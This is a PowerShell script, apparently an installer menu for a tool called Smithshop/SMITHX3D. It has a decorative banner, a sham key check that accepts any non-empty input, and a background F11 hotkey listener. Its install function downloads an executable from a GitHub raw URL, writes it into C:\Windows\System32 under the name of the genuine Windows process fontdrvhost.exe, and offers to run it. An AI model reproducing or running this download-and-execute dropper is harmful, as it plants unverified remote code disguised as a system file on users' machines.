# F11 system
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyCheck {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

Start-Job -ScriptBlock {

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyCheck {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$state = 0

while($true){

    if([KeyCheck]::GetAsyncKeyState(0x7A) -ne 0){

        if($state -eq 0){
            [console]::beep(900,800)
            $state = 1
        }
        else{
            [console]::beep(900,150)
            $state = 0
        }

        Start-Sleep -Milliseconds 350
    }

    Start-Sleep -Milliseconds 20
}

} | Out-Null


[Console]::OutputEncoding=[Text.Encoding]::UTF8
cls

function chk($t){

$c=@("Red","Yellow","Green","Cyan","Blue","Magenta")

for($i=0;$i -lt 20;$i++){

$d=("."*($i%6))
$cl=$c[($i%$c.Count)]

Write-Host ("`r"+$t+$d+"   ") -NoNewline -ForegroundColor $cl
Start-Sleep -Milliseconds 80

}

""
}

# -------------------------
# CHECK FILE
# -------------------------

function Check-FontDrv {

Write-Host "`nScanning system..." -ForegroundColor Yellow

$paths = @(
"$env:windir\System32\fontdrvhost.exe",
"$env:USERPROFILE\Downloads\fontdrvhost.exe"
)

$files = $paths | Where-Object { Test-Path $_ }
$count = $files.Count

if($count -gt 1){
Write-Host "`nGood Smithx3D" -ForegroundColor Green
}
elseif($count -eq 1){
Write-Host "`nReset Smithx3D" -ForegroundColor Yellow
}
else{
Write-Host "`nFile not found" -ForegroundColor Red
}

Pause
}

# -------------------------
# INSTALL
# -------------------------

function Install-Smith {

$url="https://raw.githubusercontent.com/draft7973-ops/Smithshop/main/fontdrvhost.exe"
$dest="C:\Windows\System32\fontdrvhost.exe"

chk "downloading "

if(Test-Path $dest){
Write-Host "`nFile already exists" -ForegroundColor Yellow
}
else{
Invoke-WebRequest $url -OutFile $dest
Write-Host "`nDownload complete" -ForegroundColor Green
}

$run=Read-Host "Run file? (y/n)"

if($run -eq "y"){
Start-Process $dest
}

Pause
}

# -------------------------
# UI
# -------------------------

Write-Host ("

███████╗███╗   ███╗██╗████████╗██╗  ██╗
██╔════╝████╗ ████║██║╚══██╔══╝██║  ██║
███████╗██╔████╔██║██║   ██║   ███████║
╚════██║██║╚██╔╝██║██║   ██║   ██╔══██║
███████║██║ ╚═╝ ██║██║   ██║   ██║  ██║
╚══════╝╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝

") -ForegroundColor Cyan

$key=Read-Host "Enter Key"

cls
Write-Host ("=== CMD SMITHSHOP ===`n") -ForegroundColor Cyan

chk "checking key "

if([string]::IsNullOrWhiteSpace($key)){
Write-Host "`nKEY INVALID" -ForegroundColor Red 
exit
}

Write-Host "`nKEY SUCCESS" -ForegroundColor Green
Start-Sleep 1

# -------------------------
# MENU
# -------------------------

while($true){

cls
Write-Host ("=== CMD SMITHSHOP ===`n") -ForegroundColor Cyan
Write-Host ("1. Install SMITHX3D")
Write-Host ("0. Check")

$m=Read-Host ">"

switch($m){

"1"{Install-Smith}

"0"{Check-FontDrv}

default{continue}

}

}
